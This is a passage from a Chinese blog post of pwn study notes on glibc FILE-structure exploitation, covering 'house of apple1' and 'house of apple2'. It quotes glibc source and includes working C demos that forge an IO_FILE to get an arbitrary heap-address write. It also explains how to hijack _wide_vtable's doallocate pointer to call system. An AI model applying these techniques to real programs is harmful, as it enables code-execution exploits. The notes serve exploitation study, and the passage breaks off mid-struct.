*p=<span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="type">char</span> *p1=<span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p chunk address--------&gt; %p\n&quot;</span>,p);</span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)(p+<span class="number">0x18</span>)=(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>)&amp;data<span class="number">-0x20</span>;</span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1200</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data value -------&gt; %s\n&quot;</span>,data);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302011939896.png" alt="image-20230201193929700"></p>
<h3 id="house-of-apple："><a href="#house-of-apple：" class="headerlink" title="house of apple："></a>house of apple：</h3><p><strong>roderick</strong> 师傅发表了关于该手法的三篇文章，我这里的学习总结只记录前两篇文章。</p>
<h4 id="house-of-apple1"><a href="#house-of-apple1" class="headerlink" title="house of apple1"></a>house of apple1</h4><h5 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h5><ol>
<li>可以泄露 <code>libc</code> 地址和堆地址 </li>
<li>可以使用任意地址写一个堆地址（通常是使用 <code>large bin attack</code> ）</li>
<li>从 <code>main</code> 函数返回或者调用 <code>exit</code> 函数</li>
</ol>
<h5 id="攻击效果："><a href="#攻击效果：" class="headerlink" title="攻击效果："></a>攻击效果：</h5><p>任意地址写一个堆地址（也可以是任意地址写一个其他地址，这个其他地址取决于伪造的 <code>IO_FILE</code>在哪里，通常是在堆上，所以是任意地址写一个堆地址）</p>
<h5 id="适用版本："><a href="#适用版本：" class="headerlink" title="适用版本："></a>适用版本：</h5><p>目前的所有 <code>libc</code> 版本，从 <code>2.23</code> 到目前最新的 <code>2.36</code></p>
<h5 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h5><p>在 <code>IO_FILE</code> 中有一个成员变量 <code>_wide_data</code> ，该成员变量为一个结构体指针（如下）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">__off64_t</span> _offset;</span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span> </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>该 <code>_IO_wide_data</code> 结构体定义如下,它是宽字节流的数据结构，用于处理宽字符的输入输出。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;		<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;	<span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;	<span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">				   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;	<span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p>而在这个结构体中有一个 <code>_wide_vtable</code> ，里面存放的也都是函数指针 （如下）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wstrn_jumps</span> <span class="title">libio_vtable</span> <span class="title">attribute_hidden</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_wstr_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wstrn_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wstr_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wstr_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wdefault_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_wdefault_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wstr_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wdefault_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这里需要强调一下 <code>_IO_jump_t</code> 和 <code>_IO_wstrn_jumps</code> 的关系</p>
<p><code>_IO_wstrn_jumps</code> 和 <code>_IO_jump_t</code> 是glibc中两种不同类型的结构体,它们是相关的。</p>
<p><code>_IO_jump_t</code>  是 <code>glibc</code> 中一个通用的结构体，用于实现文件流的多态性。它定义了一组函数指针，这些函数指针指向文件流的不同操作，如读写、定位、关闭等。而 <code>_IO_wstrn_jumps</code> 是 <code>_IO_jump_t</code> 的一个实例。它是用于实现宽字符流的。它继承了 <code>_IO_jump_t</code> 的所有函数指针，并定义了一些额外的函数指针，用于支持宽字符流的特殊操作。</p>
<p>回顾一下 <code>_IO_jump_t</code> 结构体 （如下）， <code>vtable</code> 是它的一个实例。此处需要理解清楚这些结构体之间彼此的关系。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h5 id="漏洞原理：-1"><a href="#漏洞原理：-1" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><p>而 <code>house of apple1</code> 中利用的漏洞位置位于 <code>_IO_wstrn_jumps</code> 结构体中的函数指针指向的 <code>_IO_wstrn_overflow</code> ,该函数源码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wstrn_overflow (FILE *fp, <span class="type">wint_t</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_wsetb (fp, snf-&gt;overflow_buf,</span><br><span class="line">		 snf-&gt;overflow_buf + (<span class="keyword">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">				      / <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>)), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_end = (snf-&gt;overflow_buf</span><br><span class="line">				      + (<span class="keyword">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">					 / <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_ptr = snf-&gt;overflow_buf;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_end = snf-&gt;overflow_buf;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数是宽字符流的溢出处理函数，当宽字符缓冲区已满，需要将数据写入指定位置（文件或者终端）时，该函数会被调用。</p>
<p>关于上面的代码首先要做一个简单的分析</p>
<ol>
<li><code>snf</code> 的地址和 <code>fp</code> 的地址相同 （也就是当前处理的这个 <code>IO_FILE</code> 的首地址）</li>
<li><code>snf-&gt;overflow_buf</code> 相对于 <code>_IO_FILE</code> 结构体的偏移为<code>0xf0</code>，紧跟着在 <code>vtable</code> 后面</li>
<li>正常情况下 <code>fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf</code> 这个条件是成立的。也就是 <code>if</code> 下的代码会被执行，完成下面的赋值操作</li>
</ol>
<p>漏洞就是在赋值上面，因为没有关于 <code>fp-&gt;_wide_data</code> 的合法性检查，如果我们能够控制 <code>fp-&gt;_wide_data</code>，（以 <code>fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf;</code> 这行代码为例）那就可以让 <code>snf-&gt;overflow_buf</code> 这个地址写入到 <code>fp-&gt;_wide_data-&gt;_IO_write_base</code>  上，而通过结构体指针操作符 <code>-&gt;</code> 来访问结构体中的成员变量本质上也只是访问的一个指针加偏移而已。因此实际上完成的写入操作是将 <code>snf-&gt;overflow_buf</code> 地址写入到了 <code>fp-&gt;_wide_data</code> 地址加 <code>0x20</code> 处，<strong>完成了一次任意地址写一个不可控地址（这个不可控地址是 <code>overflow_buf</code> 的地址，不过通常我们伪造的 <code>IO_FILE</code> 在堆上，所以这个地址通常是个堆地址）</strong>，之后还有几次赋值操作，原理依然如上。</p>
<p>自己写了一个 <code>demo</code> 如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Ubuntu GLIBC 2.35-0ubuntu3.1 </span></span><br><span class="line"><span class="comment">// gcc demo.c -o demo -g -w</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> data[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data address -------&gt; %p\n&quot;</span>,&amp;data);<span class="comment">//最终被写入数据的全局变量地址 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data value   -------&gt; %s\n&quot;</span>,data);<span class="comment">//此时全局的内容为空 </span></span><br><span class="line">    </span><br><span class="line">	<span class="type">void</span> *libc_base=&amp;<span class="built_in">printf</span><span class="number">-0x60770</span>;<span class="comment">//获取libc基地址 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libc base address ------&gt; %p\n&quot;</span>,libc_base);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *p=<span class="built_in">malloc</span>(<span class="number">0x100</span>);<span class="comment">//该堆块就是用来伪造IO_FILE的 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Forged IO_ File address--------&gt; %p\n&quot;</span>,p);</span><br><span class="line">    </span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> _IO_wstrn_jumps =libc_base+<span class="number">0x215dc0</span>;<span class="comment">//获取_IO_wstrn_jumps的地址 </span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *vtable=p+<span class="number">0xd8</span>;<span class="comment">//获取伪造的IO_FILE的地址 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> io_stdin=libc_base+<span class="number">0x219aa0</span>;<span class="comment">//获取_IO_2_1_stdin_结构体的地址 </span></span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)(io_stdin+<span class="number">0x68</span>)=(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>)(p);</span><br><span class="line">	<span class="comment">//该攻击的第一步，需要先将伪造的IO_FILE添加到_IO_list_all中</span></span><br><span class="line">	<span class="comment">//我这里选择了篡改_IO_2_1_stdin_中的_chain字段，将其改为伪造的IO_FILE </span></span><br><span class="line">	 </span><br><span class="line">    </span><br><span class="line">    *(vtable)=_IO_wstrn_jumps;<span class="comment">//该攻击的第二步，将IO_FILE中的vtable改成 _IO_wstrn_jumps的地址 </span></span><br><span class="line">    </span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>*)(p+<span class="number">0xa0</span>)=(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>)(data<span class="number">-0x18</span>);</span><br><span class="line">	<span class="comment">//攻击第三步，将伪造的_IO_FILE中的_wide_data字段改为目标地址</span></span><br><span class="line">	<span class="comment">//触发攻击时就会向目标地址加0x18 0x20等等位置写入snf-&gt;overflow_buf的地址</span></span><br><span class="line">	<span class="comment">//这里我提前将目标地址减了0x18，在触发攻击时，就可以直接向目标地址写入snf-&gt;overflow_buf的地址了 </span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//下面两行代码是为了绕过检查，触发overflow函数，分别将write_base设置为0 write_ptr设置为1</span></span><br><span class="line">	<span class="comment">//需要注意的是本来还需要伪造_mode字段为0，但是通常在堆块上这个字段默认是0</span></span><br><span class="line">	<span class="comment">//所以下面就没有伪造，但并不意味这_mode字段不需要伪造 </span></span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>*)(p+<span class="number">0x28</span>)=(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>)(<span class="number">1</span>);</span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>*)(p+<span class="number">0x20</span>)=(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>)(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    fcloseall();<span class="comment">//触发攻击 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data value -------&gt; %s\n&quot;</span>,data);<span class="comment">//最后打印data的内容，发现原本内容是空的data变成了snf-&gt;overflow_buf的地址 </span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>输出结果：</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305121929997.png" alt="image-20230512192939734"></p>
<p>因为上图中最后的 <code>data value</code> 是个地址，存在不可见字符，实际值如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305121934919.png" alt="image-20230512193409832"></p>
<p>上述便是 <code>house of apple1</code> 的学习总结，该攻击并不能直接获取 <code>shell </code> ，通常情况下是只能向几个地址里写入一个堆地址。但是通过对于 <code>house of apple1</code> 的学习让我体会到了一种新型的攻击思路，个人感觉最好的状态就是先看文章学习，最后根据自己的理解写一个 <code>demo</code> ，只要 <code>demo</code> 没有成功触发攻击就说明自己还有地方没理解，当 <code>demo</code> 成功触发攻击时，就说明自己的理解是正确的。</p>
<h4 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a>house of apple2</h4><h5 id="利用条件：-1"><a href="#利用条件：-1" class="headerlink" title="利用条件："></a>利用条件：</h5><ol>
<li>可以泄露 <code>libc</code> 地址和堆地址 </li>
<li>可以使用任意地址写一个堆地址（通常是使用 <code>large bin attack</code> ）</li>
<li>从 <code>main</code> 函数返回或者调用 <code>exit</code> 函数</li>
</ol>
<h5 id="攻击效果：-1"><a href="#攻击效果：-1" class="headerlink" title="攻击效果："></a>攻击效果：</h5><p>控制程序的执行流</p>
<h5 id="适用版本：-1"><a href="#适用版本：-1" class="headerlink" title="适用版本："></a>适用版本：</h5><p>目前的所有 <code>libc</code> 版本，从 <code>2.23</code> 到目前最新的 <code>2.36</code></p>
<h5 id="前置知识：-1"><a href="#前置知识：-1" class="headerlink" title="前置知识："></a>前置知识：</h5><p>在 <code>2.23</code> 的 <code>libc</code> 版本中，我们是可以劫持 <code>vtable</code> ，从而替换其中的函数指针来控制程序的执行流，但是在之后的 <code>libc</code> 版本中，都对 <code>vtable</code> 进行了合法性检查,判断 <code>vtable</code> 地址是否在一个合法的区间里。但这不意味着无法伪造 <code>vtable</code> 了，目前如果将 <code>vtable</code> 原本存放的 <code>_IO_jump_t</code> 改成 <code>_IO_wfile_jumps</code> 依然是可以通过检查的。（ <strong>roderick</strong> 师傅说只要是 <code>jumps</code> 都满足检测 ）（在 <code>house of apple1</code> 中我们是将 <code>_IO_jump_t</code> 改成了 <code>_IO_wstrn_jumps</code>）</p>
<p><code>_IO_wfile_jumps</code> 结构体如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wfile_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_new_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wfile_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wfile_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wfile_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br><span class="line">libc_hidden_data_def (_IO_wfile_jumps)</span><br></pre></td></tr></table></figure>

<p>还记得我们之前通常都是劫持 <code>exit</code> 函数中的这个 <code>_IO_OVERFLOW</code> 么，<code>house of apple2</code> 有多个 <code>IO</code> 利用链，这里我只总结从这个 <code>_IO_OVERFLOW</code> 触发的利用链。</p>
<h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>假设我们现在将原本 <code>vtable</code> 中的 <code>_IO_jump_t</code> 结构体地址改成 <code>_IO_wfile_jumps</code> ,那么本应去调用 <code>__overflow</code> 函数不会被执行，而是去调用 <code>_IO_wfile_jumps</code> 中的 <code>_IO_wfile_overflow</code> 函数。</p>
<p>这里分析下 <code>_IO_wfile_overflow</code> 函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_overflow (FILE *f, <span class="type">wint_t</span> wch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_wdoallocbuf (f);</span><br><span class="line">	  _IO_free_wbackup_area (f);</span><br><span class="line">	  _IO_wsetg (f, f-&gt;_wide_data-&gt;_IO_buf_base,</span><br><span class="line">		     f-&gt;_wide_data-&gt;_IO_buf_base, f-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      _IO_doallocbuf (f);</span><br><span class="line">	      _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_wfile_overflow)</span><br></pre></td></tr></table></figure>

<p>我们的目的是要调用到 <code>_IO_wdoallocbuf</code> 函数，至于需要绕过的检查后面再总结。</p>
<p><code>_IO_wdoallocbuf</code> 函数源码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wdoallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WDOALLOCATE (fp) != WEOF)</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,</span><br><span class="line">		     fp-&gt;_wide_data-&gt;_shortbuf + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_wdoallocbuf)</span><br></pre></td></tr></table></figure>



<p><code>_IO_WDOALLOCATE (fp)</code> 这里就是我们最后劫持程序执行流的地方，它是这样被调用的 <code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code> 。这个函数最终也是通过 <code>vtable</code> 被调用的，但这个是 <code>_wide_data</code> 结构体中的 <code>_wide_vtable</code> 所调用的，由于没有合法性检测，就可以伪造这个 <code>vtable</code>。</p>
<p>再来回顾下上面提到的 <code>_wide_vtable</code> 结构体 ,可以看到这个 <code>doallocate</code> 位于偏移 <code>0x68</code> 的位置。因此我们只需要让伪造的这个 <code>vtable</code> 加 <code>0x68</code> 的位置为 <code>system</code> 函数即可。接下来想获取 <code>shell</code> ，只需要控制参数即可。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span 